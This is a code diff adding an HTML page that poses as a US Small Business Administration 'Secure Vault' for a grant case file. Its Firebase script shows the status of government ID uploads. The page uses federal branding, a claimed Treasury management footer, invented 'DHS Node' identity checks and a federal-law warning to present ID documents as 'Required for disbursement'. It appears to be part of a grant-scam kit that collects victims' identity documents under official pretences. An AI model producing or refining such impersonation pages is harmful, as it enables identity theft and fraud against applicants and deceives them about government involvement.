@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Document Vault</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body { background: #f1f5f9; }
+        
+        .vault-header-box {
+            background: #fff; border: 1px solid #cbd5e1; padding: 20px;
+            border-radius: 12px; margin-top: 15px; border-left: 6px solid var(--sba-blue);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .file-list { margin-top: 20px; }
+        .file-row {
+            background: white; border: 1px solid #e2e8f0; padding: 18px;
+            border-radius: 12px; display: flex; align-items: center; margin-bottom: 12px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.02); transition: 0.3s ease;
+        }
+        
+        .file-icon { font-size: 26px; flex-shrink: 0; }
+        .file-info { flex: 1; margin-left: 15px; overflow: hidden; }
+        .file-name { font-size: 12px; font-weight: 900; color: var(--sba-blue); text-transform: uppercase; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .file-meta { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
+        
+        .status-tag {
+            font-size: 9px; font-weight: 900; padding: 6px 10px; border-radius: 6px;
+            text-transform: uppercase; letter-spacing: 0.5px; flex-shrink: 0;
+        }
+        .tag-verified { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
+        .tag-pending { 
+            background: #fffbeb; color: #92400e; border: 1px solid #fef3c7; 
+            animation: pulse 2s infinite;
+        }
+        .tag-missing { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .lock-notice {
+            font-size: 10px; color: #64748b; line-height: 1.5; padding: 15px;
+            border: 1px dashed #cbd5e1; border-radius: 10px; background: rgba(255,255,255,0.5);
+            text-align: center; margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        FEDERAL REPOSITORY — ACCESS ID: <span id="vaultID">...</span>
+    </div>
+
+    <div class="nav-header">
+        <h1>SECURE VAULT</h1>
+        <a href="dashboard.html" style="color:white; text-decoration:none; font-size:11px; font-weight:800; border: 1px solid rgba(255,255,255,0.3); padding: 5px 10px; border-radius: 6px;">EXIT</a>
+    </div>
+
+    <div class="container">
+        
+        <div class="vault-header-box">
+            <h2 style="font-size: 18px; margin: 0; color: var(--sba-blue); font-weight: 900;">Certified Documents</h2>
+            <p style="font-size: 12px; color: #64748b; margin: 5px 0 0;">Case Record: <b id="caseRef" style="color:var(--sba-blue);">...</b></p>
+        </div>
+
+        <div class="file-list">
+            <div class="file-row">
+                <span class="file-icon">📄</span>
+                <div class="file-info">
+                    <div class="file-name">SBA_FORM_3501.PDF</div>
+                    <div class="file-meta">Master Grant Application (Generated)</div>
+                </div>
+                <span class="status-tag tag-verified">Certified</span>
+            </div>
+
+            <div class="file-row">
+                <span class="file-icon">📜</span>
+                <div class="file-info">
+                    <div class="file-name">LEGAL_TC_V4.PDF</div>
+                    <div class="file-meta">Terms & Conditions (E-Signed)</div>
+                </div>
+                <span class="status-tag tag-verified">Signed</span>
+            </div>
+
+            <div class="file-row" id="rowFront">
+                <span class="file-icon">🪪</span>
+                <div class="file-info">
+                    <div class="file-name">GOVT_ID_FRONT.ENC</div>
+                    <div class="file-meta" id="idFrontMeta">Required for disbursement</div>
+                </div>
+                <span id="idFrontStatus" class="status-tag tag-missing">Missing</span>
+            </div>
+
+            <div class="file-row" id="rowBack">
+                <span class="file-icon">🔄</span>
+                <div class="file-info">
+                    <div class="file-name">GOVT_ID_BACK.ENC</div>
+                    <div class="file-meta" id="idBackMeta">Required for disbursement</div>
+                </div>
+                <span id="idBackStatus" class="status-tag tag-missing">Missing</span>
+            </div>
+        </div>
+
+        <div class="lock-notice">
+            🔒 <b>ENCRYPTION LEVEL: AES-256-GCM</b><br>
+            Federal law prohibits the unauthorized alteration or deletion of documents within a secured case file once disbursement protocols have been initiated.
+        </div>
+
+        <div class="legal-footer" style="text-align: center; margin-top: 30px;">
+            SBA Office of the CIO | Document Control No. 9920-A<br>
+            Managed by Treasury Bureau of the Fiscal Service
+        </div>
+    </div>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                document.getElementById('vaultID').innerText = user.uid.substring(0,8).toUpperCase();
+                document.getElementById('caseRef').innerText = `SBA-${user.uid.substring(0,6).toUpperCase()}`;
+
+                onSnapshot(doc(db, "users", user.uid), (docSnap) => {
+                    if (docSnap.exists()) {
+                        const data = docSnap.data();
+                        const sF = document.getElementById('idFrontStatus');
+                        const sB = document.getElementById('idBackStatus');
+                        const mF = document.getElementById('idFrontMeta');
+                        const mB = document.getElementById('idBackMeta');
+
+                        if (data.kycStatus === "UNDER_REVIEW") {
+                            sF.innerText = "Reviewing"; sF.className = "status-tag tag-pending";
+                            sB.innerText = "Reviewing"; sB.className = "status-tag tag-pending";
+                            mF.innerText = "File received. Awaiting Officer Clearance.";
+                            mB.innerText = "File received. Awaiting Officer Clearance.";
+                        } 
+                        else if (data.kycStatus === "VERIFIED") {
+                            sF.innerText = "Verified"; sF.className = "status-tag tag-verified";
+                            sB.innerText = "Verified"; sB.className = "status-tag tag-verified";
+                            mF.innerText = "Identity Authenticated via DHS Node";
+                            mB.innerText = "Identity Authenticated via DHS Node";
+                        }
+                    }
+                });
+            } else { window.location.href = 'index.html'; }
+        });
+    </script>
+</body>
+</html>
